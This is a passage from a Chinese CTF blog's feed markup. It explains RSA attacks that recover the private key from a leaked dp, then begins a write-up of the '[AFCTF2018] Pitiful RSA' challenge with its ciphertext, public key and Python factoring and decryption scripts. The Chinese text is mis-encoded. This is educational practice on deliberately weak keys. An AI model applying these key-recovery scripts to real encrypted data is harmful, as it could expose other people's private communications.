style="top:1.34em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:5em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>æ­¤æ—¶ç”±äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo>&lt;</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp&lt;(p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼Œå› æ­¤<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>&gt;</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">e&gt;x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ï¼Œæ‰€ä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>å°±åœ¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span>ï¼Œæ­¤æ—¶åªè¦éå†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span>ï¼Œå¹¶ä¸”è®¡ç®—</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">(dp*e-1)/x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">x</span></span></span></span></span></p><p>åªè¦æœ€åç»“æœæ˜¯æ•´æ•°ï¼Œé‚£ä¹ˆå°±å¤§æ¦‚ç‡æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼Œè¿™æ—¶å€™ç»§ç»­å¾€ä¸‹ç®—ï¼Œå¦‚æœè§£å¯†ç»“æœä¸æ˜¯ä¹±ç å°±åŸºæœ¬ä¸Šæ˜¯æ­£ç¡®çš„äº†ã€‚è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> (dp*e-<span class="hljs-number">1</span>)%i == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n%(((dp*e-<span class="hljs-number">1</span>)/i)+<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:<br>            p=((dp*e-<span class="hljs-number">1</span>)/i)+<span class="hljs-number">1</span><br>            q=n/(((dp*e-<span class="hljs-number">1</span>)/i)+<span class="hljs-number">1</span>)<br>            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>            d = gmpy2.invert(e,phi)%phi<br></code></pre></td></tr></table></figure><h3 id="eç‰¹åˆ«å¤§çš„æƒ…å†µ">eç‰¹åˆ«å¤§çš„æƒ…å†µ</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>ç‰¹åˆ«å¤§çš„æ—¶å€™éå†éƒ½éœ€è¦èŠ±å¾ˆé•¿çš„æ—¶é—´ï¼Œå†è¿›è¡Œåˆ¤æ–­ä»¥åŠè®¡ç®—æ›´éœ€è¦å¤§é‡æ—¶é—´ï¼Œå¯èƒ½è·‘ä¸€å¹´éƒ½è·‘ä¸å‡ºæ¥ã€‚è¿™æ—¶å€™æˆ‘ä»¬æ¢ä¸€ç§åˆ†ææ–¹å¼ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mi>d</mi><mo>âˆ—</mo><mi>e</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mn>2</mn><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi><mo>âˆ’</mo><mn>1</mn></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>k</mi><mo>âˆ—</mo><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mn>2</mn><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆ’</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mi>d</mi><mi>p</mi><mo>âˆ—</mo><mi>e</mi><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} dp*e &amp;\equiv d*e \mod (p-1)\\dp*e &amp;\equiv 1 \mod(p-1)\\2^{dp*e-1} &amp;\equiv 1 \mod p\\k*p&amp;= 2^{dp*e-1}-1 \\p&amp;=gcd(2^{dp*e-1}-1,n)\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.6773em;vertical-align:-3.5887em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.0887em;"><span style="top:-6.2487em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-4.7487em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span></span></span><span style="top:-3.1896em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight">e</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.6304em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">p</span></span></span><span style="top:-0.0713em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.5887em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.0887em;"><span style="top:-6.2487em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">e</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-4.7487em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-3.1896em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span><span style="top:-1.6304em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight">e</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-0.0713em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight">e</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.5887em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="på’Œqé€‰å–çš„ç‰¹åˆ«è¿‘">på’Œqé€‰å–çš„ç‰¹åˆ«è¿‘</h3>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>rsa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuåˆ·é¢˜è®°å½•1</title>
    <link href="/2023/05/14/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
    <url>/2023/05/14/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹åœ¨buuåˆ·çš„cryptoé¢˜ç›®</p><span id="more"></span><h1 id="åˆ·é¢˜è®°å½•">åˆ·é¢˜è®°å½•</h1><h2 id="AFCTF2018-å¯æ€œçš„RSA">[AFCTF2018]å¯æ€œçš„RSA</h2><p>åšçš„æŒºéš¾å—çš„ä¸€é“é¢˜</p><p>é¦–å…ˆçœ‹é¢˜ç›®ç»™çš„æ–‡ä»¶</p><p>â€œflag.encâ€:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW</span>/MgPwxVBSl46joFCQ1plcnlDGfL19K/<span class="hljs-number">3</span>PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/<span class="hljs-number">1</span>EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/<span class="hljs-number">6</span>/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==<br></code></pre></td></tr></table></figure><p>â€œpublic.keyâ€:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">-----BEGIN</span> PUBLIC KEY<span class="hljs-params">-----</span><br>MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQM<span class="hljs-keyword">ls</span>Yv184kJfRcjeGa7Uc/4<br>3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv<br>tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59<br>NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT<br>+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt<br>Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM<br>5q5TAgMBAAE=<br><span class="hljs-params">-----END</span> PUBLIC KEY<span class="hljs-params">-----</span><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½ç”¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">pow(c,d,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>çš„æ–¹æ³•æ¥åšï¼Œæ‰€ä»¥ä¸€ç›´å¾—åˆ°ä¹±ç </p><p>é¦–å…ˆè¯»å…¬é’¥æ–‡ä»¶ï¼Œè½¬æ¢æˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./[AFCTF2018]å¯æ€œçš„RSA/public.key&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>key=RSA.importKey(f)<br>n=key.n<br>e=key.e<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨çº¿ç½‘ç«™è§£å¯†å¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ï¼Œéšåå°±æ˜¯æ±‚<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">3133337</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæˆ‘åˆ†æå¯†æ–‡æ–‡ä»¶çš„æ—¶å€™æ˜¯ç”¨base64è§£å¯†ä¹‹åå†è½¬æ¢æˆæ•°å­—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./[AFCTF2018]å¯æ€œçš„RSA/flag.enc&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>c=b64decode(flag)<br>c=bytes_to_long(c)<br></code></pre></td></tr></table></figure><p>éšåè¿›è¡Œè®¡ç®—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸²ä¹±ç </p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>b2u~<span class="hljs-char escape_">\x</span>c4<span class="hljs-char escape_">\x</span>d0<span class="hljs-char escape_">\x</span>beV<span class="hljs-char escape_">\x</span>1c<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>0b<span class="hljs-char escape_">\x</span>16F<span class="hljs-char escape_">\x</span>ee[<span class="hljs-char escape_">\x</span>e9<span class="hljs-char escape_">\x</span>f4<span class="hljs-char escape_">\x</span>bfJ<span class="hljs-char escape_">\x</span>d2<span class="hljs-char escape_">\x</span>17p<span class="hljs-char escape_">\x</span>c2c<span class="hljs-char escape_">\x</span>fcvb<span class="hljs-char escape_">\x</span>14<span class="hljs-char escape_">\x</span>e4<span class="hljs-char escape_">\x</span>8c`A<span class="hljs-char escape_">\x</span>d4<span class="hljs-char escape_">\&#x27;</span>Iy=<span class="hljs-char escape_">\x</span>11<span class="hljs-char escape_">\x</span>eah:<span class="hljs-char escape_">\x</span>b9n<span class="hljs-char escape_">\x</span>0b<span class="hljs-char escape_">\x</span>01<span class="hljs-char escape_">\x</span>d2<span class="hljs-char escape_">\x</span>03V<span class="hljs-char escape_">\x</span>aa<span class="hljs-char escape_">\x</span>b2C&#123;<span class="hljs-char escape_">\x</span>c3yP<span class="hljs-char escape_">\x</span>8aw<span class="hljs-char escape_">\x</span>d3\\<span class="hljs-char escape_">\x</span>e5<span class="hljs-char escape_">\x</span>89<span class="hljs-char escape_">\x</span>8e<span class="hljs-char escape_">\x</span>8b<span class="hljs-char escape_">\x</span>f7<span class="hljs-char escape_">\x</span>96<span class="hljs-char escape_">\x</span>ab[&quot;<span class="hljs-char escape_">\x</span>fb<span class="hljs-char escape_">\x</span>b7(<span class="hljs-char escape_">\x</span>fd(<span class="hljs-char escape_">\x</span>8b<span class="hljs-char escape_">\x</span>a8L,<span class="hljs-char escape_">\x</span>f84,l<span class="hljs-char escape_">\x</span>f6<span class="hljs-char escape_">\x</span>ba<span class="hljs-char escape_">\x</span>0cr--<span class="hljs-char escape_">\x</span>af<span class="hljs-char escape_">\x</span>fc<span class="hljs-char escape_">\x</span>bb<span class="hljs-char escape_">\x</span>cf6<span class="hljs-char escape_">\x</span>dfh<span class="hljs-char escape_">\x</span>a4<span class="hljs-char escape_">\x</span>ae<span class="hljs-char escape_">\x</span>b5<span class="hljs-char escape_">\x</span>9dh&#123;<span class="hljs-char escape_">\x</span>89<span class="hljs-char escape_">\x</span>0f]/;<span class="hljs-char escape_">\x</span>fa<span class="hljs-char escape_">\x</span>cf<span class="hljs-char escape_">\x</span>adF<span class="hljs-char escape_">\x</span>9d<span class="hljs-char escape_">\x</span>dc<span class="hljs-char escape_">\x</span>15L!<span class="hljs-char escape_">\x</span>bb<span class="hljs-char escape_">\x</span>ac<span class="hljs-char escape_">\x</span>af^e<span class="hljs-char escape_">\x</span>1e<span 